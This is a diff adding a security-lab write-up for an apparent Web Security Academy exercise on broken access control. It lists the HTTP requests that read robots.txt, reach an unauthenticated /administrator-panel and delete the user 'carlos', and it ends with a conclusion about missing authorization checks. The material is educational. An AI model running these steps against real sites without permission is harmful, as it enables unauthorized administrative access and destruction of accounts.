@@ -1,0 +1,102 @@
+==================================================
+Lab 05 - Unprotected Admin Functionality
+==================================================
+
+Target
+
+https://0aa400920440d3bd812f1b8e002f0004.web-security-academy.net
+
+Category
+
+Broken Access Control
+
+Difficulty
+
+Apprentice
+
+Status
+
+Solved
+
+==================================================
+Request 1 - robots.txt
+==================================================
+
+GET /robots.txt HTTP/2
+Host: 0aa400920440d3bd812f1b8e002f0004.web-security-academy.net
+
+--------------------------------------------------
+Response
+--------------------------------------------------
+
+User-agent: *
+Disallow: /administrator-panel
+
+--------------------------------------------------
+Observation
+--------------------------------------------------
+
+The robots.txt file disclosed the location of the administrator panel.
+
+robots.txt is intended for search engine crawlers and does not provide any access control.
+
+==================================================
+Request 2 - Administrator Panel
+==================================================
+
+GET /administrator-panel HTTP/2
+Host: 0aa400920440d3bd812f1b8e002f0004.web-security-academy.net
+
+--------------------------------------------------
+Observation
+--------------------------------------------------
+
+The administrator panel was accessible without authentication.
+
+The application did not redirect the user to a login page.
+
+No authorization checks were enforced before granting access.
+
+==================================================
+Request 3 - Delete User
+==================================================
+
+NOTE:
+
+The exact request depends on the implementation of the lab.
+
+Copy the request directly from Burp Suite HTTP History and paste it below.
+
+Example:
+
+GET /administrator-panel/delete?username=carlos HTTP/2
+Host: 0aa400920440d3bd812f1b8e002f0004.web-security-academy.net
+
+OR
+
+POST /administrator-panel/delete HTTP/2
+Host: 0aa400920440d3bd812f1b8e002f0004.web-security-academy.net
+
+username=carlos
+
+--------------------------------------------------
+Observation
+--------------------------------------------------
+
+The request successfully deleted the user "carlos".
+
+The application processed the request without verifying administrator privileges.
+
+The lab was marked as solved.
+
+==================================================
+Security Conclusion
+==================================================
+
+The vulnerability was not the presence of robots.txt.
+
+The vulnerability was that sensitive administrative functionality was exposed without enforcing authentication or authorization.
+
+robots.txt merely helped discover the endpoint.
+
+This is a classic Broken Access Control vulnerability involving unprotected administrative functionality.
